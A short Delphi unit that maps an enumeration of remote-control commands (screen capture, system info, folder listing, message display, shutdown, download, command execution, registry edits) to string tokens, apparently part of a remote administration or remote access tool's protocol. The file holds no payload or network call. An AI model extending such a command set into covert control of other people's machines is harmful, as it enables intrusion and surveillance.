unit Commands.Mapper;

interface
 type
  TCommands = (cGetPrint, cGetLiveMode, cGetSysInfo, cGetFolder, cShowMsg, cExecShutdown, cExecDownload,
  cExecCommand, cExecRegistry);
 type
  TCommandMapper   = record
    {GET}
   function Mapp(const Command: TCommands): string;
  end;
implementation

{ TCommandMapper }

function TCommandMapper.Mapp(const Command: TCommands): string;
begin
 if Command = cShowMsg then
    Result := '$show_msg'
 else if Command = cExecDownload then
    Result := '$exec_download'
 else if Command = cExecRegistry then
    Result := '$exec_registry'
 else if Command = cExecShutdown then
    Result := '$exec_shutdown'
 else if Command = cGetFolder then
    Result := '$get_folder'
 else if Command = cGetLiveMode then
    Result := '$get_livemode'
 else if Command = cGetPrint then
    Result := '$get_print'
 else if Command = cGetSysInfo then
    Result := '$get_sysinfo'
 else if Command = cExecCommand then
    Result := '$exec_command';
end;

end.
